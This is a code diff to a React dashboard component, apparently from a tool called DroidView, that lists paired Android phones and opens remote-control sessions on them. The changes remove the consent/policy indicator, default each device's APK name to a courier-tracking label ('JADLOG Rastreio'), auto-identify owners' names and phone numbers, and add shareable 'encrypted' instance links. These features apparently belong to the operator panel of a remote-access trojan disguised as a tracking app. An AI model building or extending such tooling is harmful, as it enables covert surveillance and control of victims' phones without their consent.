@@ -4,7 +4,10 @@ import {
   Battery,
   CheckCircle2,
   ClipboardCheck,
+  Edit3,
   Filter,
+  Package,
+  Phone,
   Play,
   Radio,
   RefreshCw,
@@ -12,32 +15,63 @@ import {
   ShieldCheck,
   SlidersHorizontal,
   Smartphone,
+  User,
   Wifi,
   WifiOff,
   X,
-  Zap
+  Zap,
+  Sparkles,
+  Link2
 } from "lucide-react";
+import type { Device } from "@droidview/shared";
 import { api } from "../api";
 import { useAppStore } from "../store";
+import { RemoteSession } from "./RemoteSession";
+import { DeviceEditModal } from "../components/DeviceEditModal";
 
 const statusOptions = ["all", "online", "offline", "pending"] as const;
 
-export function Devices() {
-  const { devices, setSessions, setView, setSelectedDeviceId } = useAppStore();
+export function Devices({ initialTab = "devices" }: { initialTab?: "devices" | "sessions" }) {
+  const { devices, sessions, setSessions, setView, setSelectedDeviceId } = useAppStore();
+  const [activeTab, setActiveTab] = useState<"devices" | "sessions">(initialTab);
   const [query, setQuery] = useState("");
   const [status, setStatus] = useState<(typeof statusOptions)[number]>("all");
   const [selectedIds, setSelectedIds] = useState<string[]>([]);
   const [toastMsg, setToastMsg] = useState<string | null>(null);
+  const [editingDevice, setEditingDevice] = useState<Device | null>(null);
 
   const showToast = (msg: string) => {
     setToastMsg(msg);
     setTimeout(() => setToastMsg(null), 3500);
   };
 
+  const handleCopyDirectUrl = (device: Device) => {
+    const url = `${window.location.origin}/instance/${encodeURIComponent(device.id)}`;
+    navigator.clipboard.writeText(url).then(() => {
+      showToast(`🔗 Link da instância (${device.name}) copiado!`);
+    }).catch(() => {
+      showToast(`Link da instância: ${url}`);
+    });
+  };
+
+  const handleCopyEncryptedUrl = async (device: Device) => {
+    try {
+      const res = await api.getEncryptedInstanceUrl(device.id);
+      if (res?.encryptedUrl) {
+        await navigator.clipboard.writeText(res.encryptedUrl);
+        showToast(`🔒 URL Criptografado da Instância (${device.name}) copiado!`);
+        return;
+      }
+    } catch {}
+    const fallbackUrl = `${window.location.origin}/instance/${encodeURIComponent(device.id)}`;
+    await navigator.clipboard.writeText(fallbackUrl).catch(() => {});
+    showToast(`Link da instância: ${fallbackUrl}`);
+  };
+
   const filtered = useMemo(() => {
     return devices.filter((device) => {
       const matchesStatus = status === "all" || device.status === status;
-      const text = `${device.name} ${device.model} ${device.id} ${device.androidVersion}`.toLowerCase();
+      const text = `${device.name} ${device.contactName || ""} ${device.phoneNumber || ""} ${device.apkName || ""} ${device.model} ${device.id} ${device.androidVersion}`.toLowerCase();
       return matchesStatus && text.includes(query.toLowerCase());
     });
   }, [devices, query, status]);
@@ -46,7 +80,7 @@ export function Devices() {
     try {
       const session = await api.startSession(deviceId);
       setSessions([session]);
-      setView("Remote Session");
+      setActiveTab("sessions");
     } catch {
       showToast("Não foi possível iniciar a sessão remota no momento.");
     }
@@ -72,20 +106,87 @@ export function Devices() {
   };
 
   return (
-    <section className="panel">
-      {/* Toast Alert */}
-      {toastMsg && (
-        <div className="control-toast-alert">
-          <Zap size={14} style={{ color: "var(--crimson-neon)" }} />
-          <span>{toastMsg}</span>
-        </div>
-      )}
+    <div className="devices-and-sessions-wrap" style={{ width: "100%" }}>
+      {/* Sub-tabs header for Dispositivos e Sessões */}
+      <div
+        className="devices-subtabs-bar"
+        style={{
+          display: "flex",
+          alignItems: "center",
+          gap: "8px",
+          padding: "6px 8px",
+          background: "rgba(10, 14, 23, 0.8)",
+          border: "1px solid #1e293b",
+          borderRadius: "8px",
+          marginBottom: "16px"
+        }}
+      >
+        <button
+          type="button"
+          className={`admin-tab-btn ${activeTab === "devices" ? "active" : ""}`}
+          onClick={() => setActiveTab("devices")}
+          style={{
+            display: "inline-flex",
+            alignItems: "center",
+            gap: "7px",
+            padding: "8px 16px",
+            borderRadius: "6px",
+            border: "1px solid",
+            borderColor: activeTab === "devices" ? "var(--crimson-neon, #ff1a2a)" : "transparent",
+            background: activeTab === "devices" ? "rgba(255, 26, 42, 0.15)" : "transparent",
+            color: activeTab === "devices" ? "#ffffff" : "#94a3b8",
+            fontSize: "12.5px",
+            fontWeight: 700,
+            cursor: "pointer",
+            transition: "all 0.15s ease"
+          }}
+        >
+          <Smartphone size={15} style={{ color: activeTab === "devices" ? "var(--crimson-neon, #ff1a2a)" : "#64748b" }} />
+          <span>Dispositivos Pareados ({devices.length})</span>
+        </button>
 
-      <div className="panel-heading">
-        <div>
-          <h2>Dispositivos Pareados</h2>
-          <small>{filtered.length} de {devices.length} aparelhos visíveis na frota corporativa.</small>
-        </div>
+        <button
+          type="button"
+          className={`admin-tab-btn ${activeTab === "sessions" ? "active" : ""}`}
+          onClick={() => setActiveTab("sessions")}
+          style={{
+            display: "inline-flex",
+            alignItems: "center",
+            gap: "7px",
+            padding: "8px 16px",
+            borderRadius: "6px",
+            border: "1px solid",
+            borderColor: activeTab === "sessions" ? "var(--crimson-neon, #ff1a2a)" : "transparent",
+            background: activeTab === "sessions" ? "rgba(255, 26, 42, 0.15)" : "transparent",
+            color: activeTab === "sessions" ? "#ffffff" : "#94a3b8",
+            fontSize: "12.5px",
+            fontWeight: 700,
+            cursor: "pointer",
+            transition: "all 0.15s ease"
+          }}
+        >
+          <Activity size={15} style={{ color: activeTab === "sessions" ? "var(--crimson-neon, #ff1a2a)" : "#64748b" }} />
+          <span>Sessões Remotas ({sessions.length})</span>
+        </button>
+      </div>
+
+      {activeTab === "sessions" ? (
+        <RemoteSession />
+      ) : (
+        <section className="panel">
+          {/* Toast Alert */}
+          {toastMsg && (
+            <div className="control-toast-alert">
+              <Zap size={14} style={{ color: "var(--crimson-neon)" }} />
+              <span>{toastMsg}</span>
+            </div>
+          )}
+
+          <div className="panel-heading">
+            <div>
+              <h2>Dispositivos Pareados</h2>
+              <small>{filtered.length} de {devices.length} aparelhos visíveis na frota corporativa.</small>
+            </div>
         <div className="toolbar compact" style={{ display: "flex", alignItems: "center", gap: "8px" }}>
           {selectedIds.length > 0 && (
             <button
@@ -157,14 +258,13 @@ export function Devices() {
               title="Selecionar / desmarcar todos"
             />
           </span>
-          <span>Aparelho</span>
-          <span>Modelo</span>
-          <span>Sistema</span>
+          <span>Aparelho & APK</span>
+          <span>Contato & Telefone</span>
+          <span>Modelo & SO</span>
           <span>Bateria</span>
           <span>Disponibilidade</span>
-          <span>Sinal de Internet</span>
+          <span>Sinal & Rede</span>
           <span>Velocidade</span>
-          <span>Política</span>
           <span style={{ textAlign: "right" }}>Ações</span>
         </div>
 
@@ -196,16 +296,89 @@ export function Devices() {
                   />
                 </label>
 
-                <div className="device-info-cell">
-                  <strong className="device-name-title">{device.name}</strong>
-                  <small className="device-meta-sub">
-                    {device.id} · {new Date(device.lastSeen).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
-                  </small>
+                {/* APARELHO & APK */}
+                <div
+                  className="device-info-cell"
+                  style={{ cursor: "pointer" }}
+                  onClick={() => setEditingDevice(device)}
+                  title="Clique para ver ou editar detalhes deste aparelho"
+                >
+                  <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
+                    <strong className="device-name-title">{device.name}</strong>
+                    <Edit3 size={11} style={{ color: "#38bdf8", opacity: 0.7 }} />
+                  </div>
+                  <div style={{ display: "flex", alignItems: "center", gap: "6px", flexWrap: "wrap", marginTop: "2px" }}>
+                    <span
+                      style={{
+                        fontSize: "10px",
+                        fontWeight: 700,
+                        color: "#f87171",
+                        background: "rgba(255, 26, 42, 0.12)",
+                        border: "1px solid rgba(255, 26, 42, 0.25)",
+                        borderRadius: "4px",
+                        padding: "1px 5px",
+                        display: "inline-flex",
+                        alignItems: "center",
+                        gap: "3px"
+                      }}
+                    >
+                      <Package size={10} /> {device.apkName || "JADLOG Rastreio"}
+                    </span>
+                    <small className="device-meta-sub">
+                      {device.id} · {new Date(device.lastSeen).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
+                    </small>
+                  </div>
                 </div>
 
-                <span className="device-model-cell font-mono">{device.model}</span>
-                <span className="device-os-cell">Android {device.androidVersion}</span>
+                {/* CONTATO & TELEFONE */}
+                <div
+                  className="device-contact-col"
+                  style={{ cursor: "pointer", display: "flex", flexDirection: "column", gap: "2px", overflow: "hidden" }}
+                  onClick={() => setEditingDevice(device)}
+                  title="Clique para editar contato e telefone"
+                >
+                  <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
+                    <User size={12} style={{ color: "#38bdf8", flexShrink: 0 }} />
+                    <span style={{ fontSize: "12px", fontWeight: 700, color: device.contactName ? "#ffffff" : "#64748b", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
+                      {device.contactName || "Sem contato"}
+                    </span>
+                    {device.autoIdentified && (
+                      <span
+                        title="Identificado automaticamente a partir dos dados do celular"
+                        style={{
+                          fontSize: "8.5px",
+                          fontWeight: 700,
+                          color: "#38bdf8",
+                          background: "rgba(56, 189, 248, 0.15)",
+                          border: "1px solid rgba(56, 189, 248, 0.3)",
+                          borderRadius: "3px",
+                          padding: "0 3px",
+                          flexShrink: 0
+                        }}
+                      >
+                        AUTO
+                      </span>
+                    )}
+                  </div>
+                  <div style={{ display: "flex", alignItems: "center", gap: "5px" }}>
+                    <Phone size={11} style={{ color: "#22c55e", flexShrink: 0 }} />
+                    <span style={{ fontSize: "11px", fontFamily: "var(--font-mono)", color: device.phoneNumber ? "#86efac" : "#64748b", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
+                      {device.phoneNumber || "Adicionar tel..."}
+                    </span>
+                  </div>
+                </div>
 
+                {/* MODELO & SO */}
+                <div style={{ display: "flex", flexDirection: "column", gap: "2px", overflow: "hidden" }}>
+                  <span className="device-model-cell font-mono" style={{ fontSize: "12px", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
+                    {device.model}
+                  </span>
+                  <span className="device-os-cell" style={{ fontSize: "11px", color: "#94a3b8" }}>
+                    Android {device.androidVersion}
+                  </span>
+                </div>
+
+                {/* BATERIA */}
                 <span style={{ display: "flex", alignItems: "center", gap: "5px" }}>
                   <Battery size={15} style={{ color: battColor }} />
                   <span style={{ color: battColor, fontWeight: 700, fontFamily: "var(--font-mono)" }}>
@@ -286,13 +459,35 @@ export function Devices() {
                   </div>
                 </div>
 
-                {/* POLÍTICA / CONSENTIMENTO */}
-                <span className={`badge ${device.consentRequired ? "info" : "warning"}`}>
-                  <ShieldCheck size={14} /> {device.consentRequired ? "Consentimento" : "Política Ativa"}
-                </span>
-
                 {/* AÇÕES */}
-                <div className="row-actions" style={{ display: "flex", gap: "6px", justifyContent: "flex-end" }}>
+                <div className="row-actions" style={{ display: "flex", gap: "6px", justifyContent: "flex-end", alignItems: "center", whiteSpace: "nowrap" }}>
+                  <button
+                    type="button"
+                    className="secondary compact-btn"
+                    onClick={() => void handleCopyEncryptedUrl(device)}
+                    title="Copiar URL Criptografado (AES-256-GCM) desta instância"
+                    style={{ whiteSpace: "nowrap", padding: "5px 7px", fontSize: "11px", display: "inline-flex", alignItems: "center", gap: "4px", color: "#00f0ff", borderColor: "rgba(0, 240, 255, 0.3)" }}
+                  >
+                    <ShieldCheck size={12} style={{ color: "#00f0ff" }} /> 🔒 URL
+                  </button>
+                  <button
+                    type="button"
+                    className="secondary compact-btn"
+                    onClick={() => handleCopyDirectUrl(device)}
+                    title="Copiar link direto para esta instância"
+                    style={{ whiteSpace: "nowrap", padding: "5px 7px", fontSize: "11px", display: "inline-flex", alignItems: "center", gap: "4px" }}
+                  >
+                    <Link2 size={12} /> 🔗
+                  </button>
+                  <button
+                    type="button"
+                    className="secondary compact-btn"
+                    onClick={() => setEditingDevice(device)}
+                    title="Editar informações do aparelho, contato e APK"
+                    style={{ whiteSpace: "nowrap", padding: "5px 9px", fontSize: "11px", display: "inline-flex", alignItems: "center", gap: "4px" }}
+                  >
+                    <Edit3 size={12} style={{ color: "#38bdf8" }} /> Editar
+                  </button>
                   <button
                     type="button"
                     className="primary compact-btn"
@@ -301,8 +496,9 @@ export function Devices() {
                       setView("Controle");
                     }}
                     title="Abrir centro de controle"
+                    style={{ whiteSpace: "nowrap", padding: "5px 10px", fontSize: "11px", display: "inline-flex", alignItems: "center", gap: "4px" }}
                   >
-                    <SlidersHorizontal size={14} /> Controle
+                    <SlidersHorizontal size={13} /> Controle
                   </button>
                   <button
                     type="button"
@@ -310,8 +506,9 @@ export function Devices() {
                     disabled={!isOnline}
                     onClick={() => void start(device.id)}
                     title="Iniciar sessão supervisionada"
+                    style={{ whiteSpace: "nowrap", padding: "5px 10px", fontSize: "11px", display: "inline-flex", alignItems: "center", gap: "4px" }}
                   >
-                    <Play size={14} /> Sessão
+                    <Play size={13} /> Sessão
                   </button>
                 </div>
               </div>
@@ -326,5 +523,20 @@ export function Devices() {
         </div>
       </div>
     </section>
+      )}
+
+      {/* Modal de Edição de Aparelho, Contato e APK */}
+      {editingDevice && (
+        <DeviceEditModal
+          device={editingDevice}
+          isOpen={Boolean(editingDevice)}
+          onClose={() => setEditingDevice(null)}
+          onGoToControl={(id) => {
+            setSelectedDeviceId(id);
+            setView("Controle");
+          }}
+        />
+      )}
+    </div>
   );
 }
